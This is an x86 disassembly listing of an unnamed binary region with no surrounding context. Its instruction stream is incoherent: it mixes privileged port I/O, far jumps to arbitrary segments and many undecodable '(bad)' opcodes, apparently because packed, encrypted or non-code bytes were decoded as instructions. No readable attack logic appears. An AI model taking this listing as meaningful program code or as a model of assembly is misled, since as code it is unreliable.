  404f9e:	or     bh,BYTE PTR [esi-0x51]
  404fa1:	mov    edi,DWORD PTR [ecx+ebx*2-0x69]
  404fa5:	adc    al,0xf9
  404fa7:	cdq    
  404fa8:	cdq    
  404fa9:	jg     0x404fb6
  404fab:	mov    eax,DWORD PTR [ebp+0x251b670c]
  404fb1:	retf   
  404fb2:	inc    ebx
  404fb3:	cmc    
  404fb4:	inc    ebx
  404fb5:	push   ss
  404fb6:	cld    
  404fb7:	pop    es
  404fb8:	inc    esi
  404fb9:	mov    ds:0xe408fe83,al
  404fbe:	rcr    DWORD PTR [ecx],0xfa
  404fc1:	gs cmp eax,0x24daec93
  404fc7:	les    ecx,FWORD PTR [esi+0x7b850c05]
  404fcd:	shr    DWORD PTR [ecx+0x321277f5],0xd8
  404fd4:	xchg   esp,eax
  404fd5:	ins    DWORD PTR es:[edi],dx
  404fd6:	mov    ch,0x5b
  404fd8:	jmp    0x404ff2
  404fda:	loope  0x404f5d
  404fdc:	mov    ebx,0xe53b29fa
  404fe1:	mov    ds:0x4a5b218,eax
  404fe6:	lods   eax,DWORD PTR ds:[esi]
  404fe7:	retf   
  404fe8:	int3   
  404fe9:	inc    DWORD PTR [ebx+0xc]
  404fec:	pop    ds
  404fed:	or     al,0x61
  404fef:	in     al,0x83
  404ff1:	push   ss
  404ff2:	adc    al,0x4
  404ff4:	xor    al,0xc9
  404ff6:	mov    bh,BYTE PTR [eax]
  404ff8:	xchg   esp,eax
  404ff9:	fwait
  404ffa:	xchg   edi,eax
  404ffb:	push   cs
  404ffc:	jne    0x405057
  404ffe:	sbb    al,0xb6
  405000:	sub    al,0x27
  405002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405003:	fs mov dh,0xdd
  405006:	ins    BYTE PTR es:[edi],dx
  405007:	jmp    0x60cb:0x11a757cf
  40500e:	push   es
  40500f:	sbb    bl,cl
  405011:	sbb    edx,0xfffffff0
  405014:	adc    ch,ah
  405016:	in     al,0x60
  405018:	stc    
  405019:	mov    esp,0x89745bc2
  40501e:	or     BYTE PTR [ecx+ecx*8-0x5fcb2c91],cl
  405025:	cdq    
  405026:	cmp    al,0x4b
  405028:	sbb    eax,0x81ab99d6
  40502d:	jmp    0x1f29fe20
  405032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405033:	mov    al,ds:0x7d43d0b5
  405038:	xor    eax,0xa91397f8
  40503d:	xor    BYTE PTR [edx-0x3039d71d],cl
  405043:	test   DWORD PTR [ebp+0x3c],ebx
  405046:	and    eax,0x3ce5a7e4
  40504b:	sbb    al,0xc
  40504d:	xor    esp,DWORD PTR [edi+0x6e]
  405050:	out    dx,eax
  405051:	adc    esp,eax
  405053:	iret   
  405054:	inc    esp
  405055:	inc    edi
  405056:	fist   DWORD PTR es:[ebx-0x3986948]
  40505d:	(bad)  
  40505e:	out    0x5b,al
  405060:	aad    0xbb
  405062:	enter  0x53db,0xbe
  405066:	enter  0xce46,0x3d
  40506a:	ins    DWORD PTR es:[edi],dx
  40506b:	or     BYTE PTR [ebx],al
  40506d:	adc    edi,DWORD PTR [edi+0x1a3adb1f]
  405073:	ja     0x405069
  405075:	jge    0x405090
  405077:	mov    BYTE PTR ds:0xf536fc47,0x95
  40507e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40507f:	fadd   QWORD PTR [edx+eiz*8-0x4c89a88c]
  405086:	sub    BYTE PTR [edi],al
  405088:	pop    edi
  405089:	into   
  40508a:	adc    dl,BYTE PTR [esi]
  40508c:	inc    bp
  40508e:	pop    edi
  40508f:	cmp    DWORD PTR [ebp+0x18652ac7],ebx
  405095:	adc    al,0xb9
  405097:	jmp    0xfe6a:0xfbcd5ea7
  40509e:	aad    0x4c
  4050a0:	push   ebp
  4050a1:	mov    bh,0xec
  4050a3:	dec    ebp
  4050a4:	sub    al,0x48
  4050a6:	jo     0x405119
  4050a8:	enter  0xd2fd,0xc0
  4050ac:	push   0x17106cde
  4050b1:	mov    edi,0xb5969a4a
  4050b6:	push   esp
  4050b7:	fsub   DWORD PTR [esi+0x71f21744]
  4050bd:	pop    esi
  4050be:	retf   0x8a7f
  4050c1:	sbb    DWORD PTR [esi-0x57ecdc7a],ebp
  4050c7:	inc    esi
  4050c8:	push   eax
  4050c9:	xchg   esp,eax
  4050ca:	jmp    0x7c6bdae4
  4050cf:	lods   al,BYTE PTR ds:[esi]
  4050d0:	gs cmp eax,0x6114d2a4
  4050d6:	out    0x5,al
  4050d8:	or     al,0xe7
  4050da:	fisub  WORD PTR [edx]
  4050dc:	push   cs
  4050dd:	xor    dl,BYTE PTR [ebx+0x3b934df7]
  4050e3:	outs   dx,DWORD PTR ds:[esi]
  4050e4:	xchg   esi,eax
  4050e5:	mov    dl,0xa
  4050e7:	ja     0x405141
  4050e9:	push   0x86ae9b07
  4050ee:	imul   ebp,DWORD PTR [ebx+0x46],0xb6570247
  4050f5:	arpl   WORD PTR [edi+eiz*4],dx
  4050f8:	dec    ecx
  4050f9:	ins    DWORD PTR es:[edi],dx
  4050fa:	test   eax,0x7276d9bb
  4050ff:	mov    DWORD PTR [esi],ecx
  405101:	adc    ecx,esi
  405103:	xor    al,0xf5
  405105:	sub    dl,BYTE PTR [edi-0x16]
  405108:	xor    cl,dh
  40510a:	hlt    
  40510b:	pop    ebx
  40510c:	sbb    al,0x2a
  40510f:	icebp  
  405110:	in     al,dx
  405111:	and    BYTE PTR [ebp-0x48c1d9a6],dl
  405117:	ss xor eax,0x38803775
  40511d:	and    ebx,edi
  40511f:	in     al,0x71
  405121:	mov    ds:0x862c24d5,al
  405126:	pop    es
  405127:	stos   DWORD PTR es:[edi],eax
  405128:	and    edi,edi
  40512a:	dec    ecx
  40512b:	out    dx,eax
  40512c:	xchg   ebp,eax
  40512d:	xor    DWORD PTR [esi-0x458012ce],ebp
  405133:	add    eax,0x734480bd
  405138:	xchg   edx,eax
  405139:	arpl   WORD PTR [ecx-0xc7ea0cf],bx
  40513f:	ja     0x405179
  405141:	mov    ds:0x2ecb5b1b,eax
  405146:	mov    edi,0x255f9d25
  40514b:	popf   
  40514c:	int    0x54
  40514e:	pop    esi
  40514f:	pop    es
  405150:	loope  0x405118
  405152:	inc    ebp
  405153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405154:	imul   esi,DWORD PTR [eax-0x37],0x21
  405158:	rcl    BYTE PTR [edx-0x21],0x75
  40515c:	cli    
  40515d:	enter  0xc7c,0x51
  405161:	cld    
  405162:	or     al,0xb3
  405164:	push   edx
  405165:	cmp    DWORD PTR [edi+0x5c],edi
  405168:	iret   
  405169:	cdq    
  40516a:	jo     0x40512d
  40516c:	mov    fs,WORD PTR [eax-0xfab10c3]
  405172:	shr    BYTE PTR [edx-0x2c],1
  405175:	pop    eax
  405176:	push   0x77
  405178:	and    BYTE PTR [edi],bl
  40517a:	dec    ecx
  40517b:	fcomp  QWORD PTR [edx-0x7e14671b]
  405181:	loopne 0x40512d
  405183:	sbb    al,0xe8
  405185:	mov    bl,0x7b
  405187:	xlat   BYTE PTR ds:[ebx]
  405188:	loop   0x4051c3
  40518a:	xor    ch,al
  40518c:	pop    ebp
  40518d:	jle    0x4051aa
  40518f:	mov    bl,0xe6
  405191:	mov    ch,0x5f
  405193:	mov    dl,0x8b
  405195:	loope  0x40513a
  405197:	fdivr  DWORD PTR [ecx+0x47971281]
  40519d:	jecxz  0x40517f
  40519f:	popa   
  4051a0:	pop    ds
  4051a1:	pop    edi
  4051a2:	pop    ds
  4051a3:	push   ss
  4051a4:	test   al,0x53
  4051a6:	fwait
  4051a7:	out    0xa4,al
  4051a9:	push   eax
  4051aa:	xchg   edx,eax
  4051ab:	inc    edx
  4051ac:	cmp    eax,0x2645f5b6
  4051b1:	fstp   TBYTE PTR [edi]
  4051b3:	call   0x1cc9411f
  4051b8:	rcr    DWORD PTR ss:[edi],cl
  4051bb:	call   0x3841:0xb4b1ecec
  4051c2:	data16 ja 0x40523a
  4051c5:	out    0xa3,al
  4051c7:	call   0x367473bc
  4051cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051cd:	(bad)  
  4051ce:	data16 test al,0xd4
  4051d1:	call   ecx
  4051d3:	mov    ecx,0x70c7fd0c
  4051d8:	sti    
  4051d9:	ret    0x3c83
  4051dc:	jb     0x4051ac
  4051de:	sub    BYTE PTR [esi+0x4dc40c19],dl
  4051e4:	cmc    
  4051e5:	pop    edi
  4051e6:	xlat   BYTE PTR ds:[ebx]
  4051e7:	int    0xc8
  4051e9:	(bad)  
  4051ea:	pop    edi
  4051eb:	mov    ecx,0x9815119a
  4051f0:	xchg   ebp,eax
  4051f1:	shl    BYTE PTR [ecx],cl
  4051f3:	adc    eax,0xfe42ec0c
  4051f8:	pop    ebp
  4051f9:	jmp    0x40521d
  4051fb:	ins    DWORD PTR es:[edi],dx
  4051fc:	sti    
  4051fd:	and    ah,ch
  4051ff:	cmp    al,0xdf
  405201:	sub    BYTE PTR [edx-0x14],dh
  405204:	xchg   ebp,eax
  405205:	inc    ebp
  405206:	sti    
  405207:	outs   dx,DWORD PTR ds:[esi]
  405208:	or     BYTE PTR [edi+eax*4+0x2f],0x89
  40520d:	pusha  
  40520e:	push   edi
  40520f:	enter  0xb085,0x1
  405213:	xchg   ecx,eax
  405214:	jne    0x4051dc
  405216:	jl     0x405244
  405218:	into   
  405219:	cmp    eax,0xb848b8c3
  40521e:	lahf   
  40521f:	enter  0x6643,0x90
  405223:	jns    0x40522e
  405225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405226:	xor    ebx,DWORD PTR [esi]
  405228:	mov    cl,0x99
  40522a:	outs   dx,DWORD PTR ds:[esi]
  40522b:	pusha  
  40522c:	mov    al,0xff
  40522e:	scas   eax,DWORD PTR es:[edi]
  40522f:	test   DWORD PTR [eax+ecx*1],esp
  405232:	xor    DWORD PTR [ebp+0x78c87f72],ebp
  405238:	loopne 0x40527e
  40523a:	inc    esp
  40523b:	clc    
  40523c:	push   ebx
  40523d:	ins    DWORD PTR es:[edi],dx
  40523e:	or     dh,cl
  405240:	sbb    eax,esi
  405242:	retf   0x4556
  405245:	sbb    al,0xdd
  405247:	iret   
  405248:	rcr    BYTE PTR [ebx-0x4a03b27c],0xe3
  40524f:	sbb    DWORD PTR [edx+0x7a336a99],ecx
  405255:	fadd   DWORD PTR [ebx+0x3371b4cc]
  40525b:	adc    edi,eax
  40525d:	stos   BYTE PTR es:[edi],al
  40525e:	repz ss xchg ah,ah
  405262:	(bad)  
  405263:	lea    ebp,[edx]
  405265:	in     eax,dx
  405266:	xchg   ebx,eax
  405267:	fiadd  WORD PTR [ecx+0x74ee3ebd]
  40526d:	or     DWORD PTR [eax+edi*1+0x195c4aa4],esi
  405274:	sub    BYTE PTR [esp+esi*2-0x41ecdc19],ch
  40527b:	test   al,0xb3
  40527d:	jmp    0x6cbe:0x6531f37b
  405284:	cwde   
  405285:	adc    al,bl
  405287:	mov    DWORD PTR [esi-0x80],0xd637229c
  40528e:	mov    eax,ds:0x36b1d421
  405293:	and    ebp,DWORD PTR [ecx-0x7fcccdf9]
  405299:	call   0x50b13da3
  40529e:	inc    esp
  40529f:	ficomp WORD PTR [esi+0x38]
  4052a2:	or     al,0xdb
  4052a4:	scas   al,BYTE PTR es:[edi]
  4052a5:	scas   eax,DWORD PTR es:[edi]
  4052a6:	fsub   DWORD PTR [esi+0x5c42a83b]
  4052ac:	mov    cl,0xba
  4052ae:	cld    
  4052af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052b0:	xchg   ecx,eax
  4052b1:	jmp    0xb6929058
  4052b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052b7:	jge    0x405335
  4052b9:	aas    
  4052ba:	mov    ds:0x8165d9c8,eax
  4052bf:	cld    
  4052c0:	xor    DWORD PTR [edi-0x71b1bb7f],ebp
  4052c6:	adc    BYTE PTR [edx+eiz*2+0x1c5ba714],bl
  4052cd:	jne    0x405343
  4052cf:	adc    ebp,DWORD PTR [esi+0x44b3b5a6]
  4052d5:	jp     0x405278
  4052d7:	sub    bh,BYTE PTR [eax+0x6591bcb2]
  4052dd:	add    BYTE PTR [eax-0x67],0xaa
  4052e1:	xchg   edx,eax
  4052e2:	data16 sub BYTE PTR [ebx],cl
  4052e5:	push   0xfffffff0
  4052e7:	das    
  4052e8:	xchg   ecx,eax
  4052e9:	pop    esi
  4052ea:	push   esp
  4052eb:	or     DWORD PTR [eax],edi
  4052ed:	mov    eax,esi
  4052ef:	and    DWORD PTR [ebx],ebx
  4052f1:	push   eax
  4052f2:	(bad)  
  4052f3:	pop    edx
  4052f4:	inc    edi
  4052f5:	hlt    
  4052f6:	call   0x9b4cf6ad
  4052fb:	inc    edi
  4052fc:	es iret 
  4052fe:	and    al,0x1e
  405300:	cwd    
  405302:	xor    al,0xae
  405304:	not    DWORD PTR [eax-0x39]
  405307:	outs   dx,DWORD PTR ds:[esi]
  405308:	leave  
  405309:	out    dx,al
  40530a:	push   esp
  40530b:	addr16 std 
  40530d:	stos   BYTE PTR es:[edi],al
  40530e:	dec    ebx
  40530f:	inc    edi
  405310:	mov    edi,DWORD PTR [ebx]
  405312:	call   0xbc5c286d
  405317:	xor    eax,0x532e08c6
  40531c:	sub    ecx,DWORD PTR [eax]
  40531e:	xchg   edx,eax
  40531f:	loopne 0x405323
  405321:	push   esp
  405322:	sbb    al,0xee
  405324:	or     eax,0xe775aa89
  405329:	int    0xb6
  40532b:	pop    esi
  40532c:	xchg   ecx,eax
  40532d:	lock loope 0x405312
  405330:	xchg   edi,eax
  405331:	xor    ebx,DWORD PTR [esi]
  405333:	inc    edx
  405334:	int    0xae
  405336:	imul   edi,edx,0x6ce2e246
  40533c:	in     al,0x98
  40533e:	sub    DWORD PTR [esi-0x258d4989],ebp
  405344:	xor    dl,BYTE PTR [edi+ebx*2-0x46]
  405348:	in     eax,dx
  405349:	aam    0xe1
  40534b:	jae    0x4052e2
  40534d:	sti    
  40534e:	sti    
  40534f:	fdivr  QWORD PTR [ebx-0x7b]
  405352:	sub    ah,BYTE PTR [esi-0x77ed97a]
  405358:	cmp    DWORD PTR [esi-0x38],ecx
  40535b:	xchg   ebp,eax
  40535c:	std    
  40535d:	mov    eax,0x2cb2c55e
  405362:	inc    edi
  405363:	sub    DWORD PTR [ecx],ebp
  405365:	(bad)  
  405366:	sbb    DWORD PTR [eax+ebp*2],esp
  405369:	std    
  40536a:	pop    esp
  40536b:	call   0x7ea0:0xe324d707
  405372:	ror    DWORD PTR [eax],cl
  405374:	push   esp
  405375:	in     eax,dx
  405376:	ins    DWORD PTR es:[edi],dx
  405377:	jg     0x4053d9
  405379:	cmp    BYTE PTR [ecx],bh
  40537b:	repz push eax
  40537d:	fwait
  40537e:	(bad)  
  40537f:	iret   
  405380:	dec    esi
  405381:	div    BYTE PTR [ebx]
  405383:	loop   0x4053d4
  405385:	in     eax,0x40
  405387:	and    bh,BYTE PTR [eax-0x6]
  40538a:	sbb    al,0xed
  40538c:	dec    esp
  40538d:	jno    0x405329
  40538f:	sub    edx,DWORD PTR [eax+0x35]
  405392:	mov    esp,0x6e72dfff
  405397:	jp     0x405353
  405399:	or     edx,DWORD PTR [eax-0x303a60fb]
  40539f:	inc    ecx
  4053a0:	adc    edx,DWORD PTR [esi*8+0x5b6e8026]
  4053a7:	leave  
  4053a8:	ss daa 
  4053aa:	lahf   
  4053ab:	into   
  4053ac:	fild   DWORD PTR [eax]
  4053ae:	xchg   esi,eax
  4053af:	dec    eax
  4053b0:	clc    
  4053b1:	mov    ecx,0x65acd13b
  4053b6:	fs jmp 0x2df5:0x6829fb63
  4053be:	aad    0xb1
  4053c0:	and    eax,DWORD PTR [ebp-0x4f]
  4053c3:	in     eax,0x85
  4053c5:	jbe    0x405352
  4053c7:	add    BYTE PTR [esi],dl
  4053c9:	fstp   TBYTE PTR [edi-0x42]
  4053cc:	or     BYTE PTR [ebp-0x7de4003e],dh
  4053d2:	jne    0x405445
  4053d4:	add    DWORD PTR [ebp-0x9],edi
  4053d7:	adc    BYTE PTR [esi+eax*2-0x71],bh
  4053db:	sub    DWORD PTR [esi-0x15a71fbc],ebx
  4053e1:	aad    0x35
  4053e3:	jbe    0x405391
  4053e5:	fst    QWORD PTR [edi+0x70]
  4053e8:	fwait
  4053e9:	push   eax
  4053ea:	cld    
  4053eb:	jecxz  0x405429
  4053ed:	inc    ebp
  4053ee:	mov    esp,DWORD PTR [edi]
  4053f0:	add    DWORD PTR [edi+0x3e],esi
  4053f3:	mov    ecx,0x26bea8aa
  4053f8:	adc    ch,ah
  4053fa:	push   0xf1e2fdc8
  4053ff:	test   DWORD PTR [edi-0x30],esp
  405402:	inc    ecx
  405403:	sbb    DWORD PTR [edi+0x13],esi
  405406:	cwde   
  405407:	pop    esi
  405408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405409:	or     cl,ah
  40540b:	dec    eax
  40540c:	lods   eax,DWORD PTR ds:[esi]
  40540d:	mov    esi,0xdfdc054e
  405412:	mov    bl,0xe6
  405414:	test   DWORD PTR [ecx],0x29037672
  40541a:	lahf   
  40541b:	enter  0xea23,0x50
  40541f:	push   0x6f
  405421:	outs   dx,DWORD PTR ds:[esi]
  405422:	lock and BYTE PTR [edx],bl
  405425:	push   edx
  405426:	pop    edi
  405427:	inc    ecx
  405428:	out    0xc5,eax
  40542a:	xor    DWORD PTR [edx-0x224883d2],ebp
  405430:	mov    al,gs:0xa6ad17f0
  405436:	sub    edi,edi
  405438:	daa    
  405439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40543a:	(bad)  [ebp-0x26]
  40543d:	test   BYTE PTR [edx+0x614dcef4],bl
  405443:	pop    ebp
  405444:	scas   al,BYTE PTR es:[edi]
  405445:	xchg   edx,eax
  405446:	inc    ecx
  405447:	sahf   
  405448:	loop   0x4054ba
  40544a:	push   ecx
  40544b:	jp     0x4053e8
  40544d:	test   eax,0x6e09eae3
  405452:	pop    es
  405453:	retf   
  405454:	test   DWORD PTR [ebp-0x25048e23],0x8ebced70
  40545e:	pop    edi
  40545f:	mov    eax,0x45e6b370
  405464:	movzx  esi,cx
  405467:	out    dx,al
  405468:	or     al,0x24
  40546a:	fwait
  40546b:	bound  ecx,QWORD PTR [ecx]
  40546d:	adc    eax,0xa9078a14
  405472:	popf   
  405473:	rol    DWORD PTR [esi+0x294c117c],0xd
  40547a:	retf   0xbbea
  40547d:	push   0x54deb2fb
  405482:	mov    ds:0x564923a6,eax
  405487:	add    ch,BYTE PTR [edx+0x10fe4d77]
  40548d:	shl    ebx,cl
  40548f:	(bad)  
  405490:	(bad)  
  405492:	std    
  405493:	sbb    BYTE PTR [ebp+0x36effd1b],0x48
  40549a:	xchg   ebp,eax
  40549b:	(bad)  [ecx-0x68]
  40549e:	mov    ds:0x24441fab,eax
  4054a3:	pop    ds
  4054a4:	adc    dl,al
  4054a6:	mov    al,0x6b
  4054a8:	dec    esi
  4054a9:	adc    cl,ah
  4054ab:	dec    ebx
  4054ac:	mov    al,0xd8
  4054ae:	mov    eax,ds:0xa9ae94e6
  4054b3:	jle    0x405470
  4054b5:	push   es
  4054b6:	push   ebp
  4054b7:	lock mov bh,0xe2
  4054ba:	std    
  4054bb:	mov    ds:0xfd84d28e,al
  4054c0:	mov    esp,DWORD PTR [ecx]
  4054c2:	push   ebx
  4054c3:	jb     0x405508
  4054c5:	int    0xec
  4054c7:	retf   
  4054c8:	iret   
  4054c9:	push   DWORD PTR [ebx]
  4054cb:	(bad)
  4054d0:	nop
  4054d1:	sub    eax,0xda32d2fc
  4054d6:	pop    ebp
  4054d7:	cld    
  4054d8:	stos   DWORD PTR es:[edi],eax
  4054d9:	ror    BYTE PTR ds:0x1fa26abc,cl
  4054df:	dec    ebx
  4054e0:	jmp    0xe6f041ca
  4054e5:	mov    edi,0x5aa56315
  4054ea:	mov    ch,0xeb
  4054ec:	mov    DWORD PTR [edx],esi
  4054ee:	jg     0x4054ec
  4054f0:	test   DWORD PTR [esi+0x662f4b18],0x3998b2b3
  4054fa:	sbb    esp,edx
  4054fc:	or     al,0xd4
  4054fe:	mov    ds:0xb427e4ce,eax
  405503:	arpl   WORD PTR [ebx-0x71],cx
  405506:	and    eax,0xf99ca2ed
  40550b:	lds    esp,FWORD PTR [edi+0x50]
  40550e:	aaa    
  40550f:	out    dx,eax
  405510:	hlt    
  405511:	push   cs
  405512:	dec    ebx
  405513:	pushf  
  405514:	mov    bl,0x65
  405516:	sbb    edi,0x3d09b3ff
  40551c:	sbb    edi,DWORD PTR [ecx]
  40551e:	or     ebp,DWORD PTR [edx+0x54c3bf15]
  405524:	cmp    BYTE PTR [edx],ch
  405526:	cmp    edx,DWORD PTR [eax]
  405528:	nop
  405529:	pop    edi
  40552a:	sub    eax,0x8ae9a3fe
  40552f:	inc    ecx
  405530:	mov    ecx,0x3c8fb46c
  405535:	retf   0x59f5
  405538:	jge    0x405599
  40553a:	stos   BYTE PTR es:[edi],al
  40553b:	addr16 (bad) 
  40553d:	lds    esp,FWORD PTR [edx+0x55]
  405540:	fisubr DWORD PTR [edx-0x4888ff2f]
  405546:	and    eax,ebx
  405548:	idiv   BYTE PTR [ecx+0x1a]
  40554b:	aaa    
  40554c:	adc    cl,cl
  40554e:	mov    esp,0x742a93ba
  405553:	cmp    dl,ch
  405555:	mov    esi,0x26210452
  40555a:	pop    eax
  40555b:	retf   
  40555c:	sbb    eax,0x76664d4a
  405561:	and    dl,BYTE PTR [eax-0x57e0dd0a]
  405567:	test   BYTE PTR ds:0x112d1223,0x7
  40556e:	ja     0x4055e5
  405570:	adc    dh,bh
  405572:	es (bad) 
  405576:	test   DWORD PTR [ebx],ecx
  405578:	add    BYTE PTR [esi-0x7a],0xa3
  40557c:	jo     0x40555d
  40557e:	mov    ch,0x17
  405580:	call   0x39abc0d9
  405585:	lock cwde 
  405587:	add    DWORD PTR [esi],esp
  405589:	mov    esi,0xd145ef8a
  40558e:	loopne 0x40551c
  405590:	gs xchg ebx,eax
  405592:	cli    
  405593:	xchg   DWORD PTR [edx],ebp
  405595:	sbb    edx,DWORD PTR [eax-0x7081dbb5]
  40559b:	jg     0x405585
  40559d:	inc    ebp
  40559e:	into   
  40559f:	mov    eax,DWORD PTR [edx-0x43f806db]
  4055a5:	rol    DWORD PTR [ebp+0xb],cl
  4055a8:	inc    ebx
  4055a9:	clc    
  4055aa:	mov    ch,0x4b
  4055ac:	stos   BYTE PTR es:[edi],al
  4055ad:	mov    edx,0x9728aea7
  4055b2:	out    dx,eax
  4055b3:	cmp    eax,0xc2cfd929
  4055b8:	popf   
  4055b9:	jae    0x40560b
  4055bb:	arpl   di,cx
  4055bd:	jle    0x4055c1
  4055bf:	and    edi,DWORD PTR [ebp+0x2d]
  4055c2:	mov    eax,0x5cea7469
  4055c7:	cs mov ebx,0x644f49db
  4055ce:	popf   
  4055cf:	addr16 mov ds:0x8233,eax
  4055d3:	xchg   ecx,eax
  4055d4:	dec    ebx
  4055d5:	sbb    cl,BYTE PTR [ebp+0x19]
  4055d8:	popa   
  4055d9:	loop   0x40559d
  4055db:	mov    ecx,0xa98b4f4e
  4055e0:	lea    esp,ds:0x21a5e91f
  4055e6:	cld    
  4055e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055e8:	(bad)  
  4055e9:	jb     0x405593
  4055eb:	add    dh,BYTE PTR [esi-0x28]
  4055ee:	imul   esi,DWORD PTR [ebx],0x28d540a6
  4055f4:	test   eax,0x9c1d1f51
  4055f9:	mov    cl,0x1b
  4055fb:	cmp    eax,0xde7f437b
  405600:	ss sub al,0xdf
  405603:	pop    ebx
  405604:	pushf  
  405605:	in     al,0xdb
  405607:	aaa    
  405608:	add    ebp,DWORD PTR [eax+ecx*2+0x2b]
  40560c:	int    0x1c
  40560e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40560f:	call   0x7a82:0xc8bc5966
  405616:	jb     0x4055c0
  405618:	add    eax,0x95e4b7fb
  40561d:	mov    ebx,DWORD PTR [esi+0x64]
  405620:	sub    DWORD PTR [esi+0x29],esp
  405623:	and    DWORD PTR [edx-0x2a7aaf3c],0x6468458e
  40562d:	jbe    0x405621
  40562f:	iret   
  405630:	xor    al,0x88
  405632:	cwde   
  405633:	sub    edx,esp
  405635:	xchg   esi,eax
  405636:	cmp    eax,DWORD PTR [eax-0xc]
  405639:	ja     0x4055f2
  40563b:	lahf   
  40563c:	inc    ecx
  40563d:	pop    ebp
  40563e:	push   es
  40563f:	loopne 0x405601
  405641:	or     eax,0xad6d66a9
  405646:	inc    eax
  405647:	jnp    0x4056aa
  405649:	iret   
  40564a:	jg     0x405611
  40564c:	pop    edx
  40564d:	sbb    dh,BYTE PTR [ebx+0x75]
  405650:	aam    0x8
  405652:	lods   al,BYTE PTR ds:[esi]
  405653:	jno    0x405647
  405655:	rcr    DWORD PTR ds:0xd2bf16ab,0x74
  40565c:	adc    al,0xda
  40565e:	mov    edi,0x8b3117c7
  405663:	rcl    BYTE PTR [edx+0x2b],0x9
  405667:	aaa    
  405668:	in     al,dx
  405669:	in     al,dx
  40566a:	shr    BYTE PTR [eax-0x1a3c1de3],1
  405670:	ins    BYTE PTR es:[edi],dx
  405671:	hlt    
  405672:	sahf   
  405673:	push   ebp
  405674:	add    eax,0xfec96f1e
  405679:	mov    edi,ebx
  40567b:	(bad)
  40567e:	mov    eax,ds:0x57de3c53
  405683:	xor    al,BYTE PTR [ebp+0x54]
  405686:	sbb    ebx,edx
  405688:	out    dx,eax
  405689:	ds add eax,0xd0cafa4a
  40568f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405690:	test   BYTE PTR ds:0xfd27efaa,dh
  405696:	or     BYTE PTR [esi+0x62b6aa1e],0x6b
  40569d:	fdiv   st(7),st
  40569f:	dec    esp
  4056a0:	pop    eax
  4056a1:	lahf   
  4056a2:	fadd   DWORD PTR [ebx]
  4056a4:	push   ecx
  4056a5:	call   0x9616:0xa14f0a7c
  4056ac:	neg    BYTE PTR [edi-0x59]
  4056af:	fwait
  4056b0:	es adc edx,esp
  4056b3:	int3   
  4056b4:	xchg   WORD PTR [edi-0x5],si
  4056b8:	in     eax,0x39
  4056ba:	xchg   edx,eax
  4056bb:	cwde   
  4056bc:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4056be:	xchg   edx,eax
  4056bf:	sub    al,0x9d
  4056c1:	or     eax,0xcba9543a
  4056c6:	inc    edx
  4056c7:	outs   dx,DWORD PTR ds:[esi]
  4056c8:	loopne 0x40570d
  4056ca:	jge    0x405739
  4056cc:	cwde   
  4056cd:	xchg   ecx,eax
  4056ce:	imul   ebp,DWORD PTR [ecx],0xffffffc9
  4056d1:	rcl    BYTE PTR [ebp+0x74b087bf],1
  4056d7:	(bad)  [edx]
  4056d9:	sahf   
  4056da:	and    eax,0x5fc53ca3
  4056df:	adc    BYTE PTR [eax],ch
  4056e1:	mov    BYTE PTR [edi],cl
  4056e3:	(bad)  
  4056e4:	in     al,0x1
  4056e6:	ja     0x40568c
  4056e8:	(bad)  [edx+0x263824f1]
  4056ee:	or     al,0x35
  4056f0:	aaa    
  4056f1:	daa    
  4056f2:	fdiv   st,st(2)
  4056f4:	sub    BYTE PTR [ebp+0x42567c7b],ch
  4056fa:	inc    ecx
  4056fb:	jb     0x4056d0
  4056fd:	stos   BYTE PTR es:[edi],al
  4056fe:	mov    ah,0x82
  405700:	stos   DWORD PTR es:[edi],eax
  405701:	test   al,0x50
  405703:	test   eax,0x5ffbb8d7
  405708:	je     0x40568a
  40570a:	stos   BYTE PTR es:[edi],al
  40570b:	push   ds
  40570c:	mov    dh,0x91
  40570e:	add    cl,BYTE PTR [ebx-0x75]
  405711:	scas   eax,DWORD PTR es:[edi]
  405712:	repz cli 
  405714:	out    0x9f,eax
  405716:	ror    BYTE PTR [ebp+0x2f],1
  405719:	hlt    
  40571a:	into   
  40571b:	loope  0x405723
  40571d:	imul   ebx,DWORD PTR [edx+0x48],0x16
  405721:	xchg   ebx,eax
  405722:	or     al,0xc1
  405724:	xor    edx,DWORD PTR ss:[edx+edx*1-0x76558027]
  40572c:	retf   0xf49b
  40572f:	fwait
  405730:	sbb    bl,BYTE PTR [ebx]
  405732:	adc    eax,0x6b1d05cd
  405737:	jle    0x40577a
  405739:	add    al,0x97
  40573b:	sub    edi,DWORD PTR [eax]
  40573d:	bound  ecx,QWORD PTR [eax+0x4a]
  405740:	aad    0x5b
  405742:	pop    esi
  405743:	bound  edi,QWORD PTR [ecx+0x7c355404]
  405749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40574a:	jae    0x4057b9
  40574c:	pop    ebx
  40574d:	adc    ch,BYTE PTR [ecx+ebx*8-0x4d]
  405751:	retf   
  405752:	scas   al,BYTE PTR es:[edi]
  405753:	rcr    ebp,0x41
  405756:	int    0x1a
  405758:	mov    ds:0xe2ea2d56,al
  40575d:	add    dh,BYTE PTR [edx-0x13c3379a]
  405763:	out    0x5e,eax
  405765:	push   esp
  405766:	cmp    eax,0xe2fc8567
  40576b:	xor    eax,0x2243a5e5
  405770:	adc    ebp,DWORD PTR [ebx-0x51077864]
  405776:	pushf  
  405777:	pop    edx
  405778:	mov    edi,0x32d170da
  40577d:	retf   0x806d
  405780:	je     0x40572b
  405782:	pop    ebx
  405783:	pop    ebp
  405784:	ror    DWORD PTR [ebp+0x7ec3600a],cl
  40578a:	in     al,0x37
  40578c:	adc    edi,DWORD PTR [esp+edi*8-0xf]
  405790:	inc    esp
  405791:	cli    
  405792:	fstp   st(3)
  405794:	gs pop ss
  405796:	mov    dh,0xa6
